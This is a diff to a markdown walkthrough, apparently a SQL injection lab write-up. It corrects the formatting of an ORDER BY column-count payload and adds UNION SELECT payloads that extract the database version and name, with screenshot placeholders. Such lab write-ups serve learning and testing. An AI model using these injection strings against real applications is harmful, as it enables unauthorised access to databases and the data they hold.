@@ -50,7 +50,7 @@ Inject the ORDER BY clause into the vulnerable parameter to identify the number 
     width="60%">
 </p>
 
-**```SQL
+```SQL
 ' ORDER BY 2--
 ```
 
@@ -93,7 +93,22 @@ Only the second column is configured to display string data on the Web Page, mak
 
 ### 3. Extract Database Metadata
 Since we know the second column is vulnerable, we can use this to extract the database version and name.
+- **To retrieve the Database Version:** 'UNION SELECT NULL, version(), NULL --
+
+**RESULT**
+
+<p align="center">
+  <img src="screenshots/version.png" alt="DATABASE Version "
+    width="60%">
+</p>
+
+- **To retrieve the Database Name:** ' UNION SELECT NULL, current_database(), NULL--
+
+**RESULT**
 
 
- 
+ <p align="center">
+  <img src="screenshots/name.png" alt="DATABASE Name "
+    width="60%">
+</p>
 
